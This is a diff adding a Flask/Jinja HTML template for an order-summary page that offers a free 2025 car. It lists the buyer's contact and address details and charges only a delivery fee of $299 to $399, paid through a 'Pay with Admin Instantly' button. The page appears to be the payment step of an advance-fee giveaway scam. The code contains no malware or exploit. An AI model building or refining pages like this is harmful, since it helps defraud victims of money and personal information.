@@ -1,0 +1,100 @@
+{% extends "base.html" %}
+{% block title %}Order Summary{% endblock %}
+{% block content %}
+
+<section class="order-section">
+  <div class="container">
+    <div class="order-card">
+      <div class="order-top">
+        <div class="order-title-block">
+          <span class="order-kicker">Order Summary</span>
+          <h2>{{ car.name }} 2025</h2>
+          <p>{{ car.type }}</p>
+        </div>
+        <div class="order-free">FREE 🎉</div>
+      </div>
+
+      <div class="order-hero">
+        <img src="{{ url_for('static', filename=car.image) }}" alt="{{ car.name }}" class="order-car-img">
+      </div>
+
+      <div class="deliver-box">
+        <h3>Deliver To</h3>
+        <p class="deliver-name">{{ data.name }}</p>
+        <p class="deliver-contact">
+          <a href="mailto:{{ data.email }}">{{ data.email }}</a> · {{ data.phone }}
+        </p>
+        <p class="deliver-address">{{ data.address }}</p>
+      </div>
+
+      <div class="deliver-box">
+        <h3>Location Details</h3>
+        <p><strong>Country:</strong> {{ data.country }}</p>
+        <p><strong>City:</strong> {{ data.city }}</p>
+        <p><strong>Zip / Postal:</strong> {{ data.zip_postal }}</p>
+        <p><strong>Promo Code:</strong> {{ data.promo_code if data.promo_code else 'None' }}</p>
+      </div>
+
+      <form method="post" class="delivery-form">
+        <h3>Select Delivery Option</h3>
+
+        <label class="delivery-option">
+          <input type="radio" name="delivery_option" value="standard" checked>
+          <div>
+            <strong>Standard Delivery <span>$299</span></strong>
+            <p>Standard international shipping & customs clearance</p>
+            <small>⏱ 10–14 business days</small>
+          </div>
+        </label>
+
+        <label class="delivery-option">
+          <input type="radio" name="delivery_option" value="express">
+          <div>
+            <strong>Express Delivery <span>$349</span></strong>
+            <p>Priority shipping with real-time tracking updates</p>
+            <small>⏱ 5–7 business days</small>
+          </div>
+        </label>
+
+        <label class="delivery-option">
+          <input type="radio" name="delivery_option" value="premium">
+          <div>
+            <strong>Premium Delivery <span>$399</span></strong>
+            <p>Fastest dispatch, white-glove doorstep delivery</p>
+            <small>⏱ 3–5 business days</small>
+          </div>
+        </label>
+
+        <div class="order-summary-footer">
+          <div>
+            <p class="fee-label">Delivery Fee Only</p>
+            <h3 id="feeAmount">$299</h3>
+            <p class="car-value">Car Value: FREE</p>
+            <p class="eta" id="etaText">10–14 business days</p>
+          </div>
+
+          <a href="{{ url_for('pay_delivery') }}" class="pay-btn">
+            Pay with Admin Instantly
+          </a>
+        </div>
+      </form>
+    </div>
+  </div>
+</section>
+
+<script>
+const options = {
+  standard: {fee: '$299', eta: '10–14 business days'},
+  express: {fee: '$349', eta: '5–7 business days'},
+  premium: {fee: '$399', eta: '3–5 business days'}
+};
+
+document.querySelectorAll('input[name="delivery_option"]').forEach(radio => {
+  radio.addEventListener('change', function(){
+    document.getElementById('feeAmount').textContent = options[this.value].fee;
+    document.getElementById('etaText').textContent = options[this.value].eta;
+  });
+});
+</script>
+
+{% endblock %}
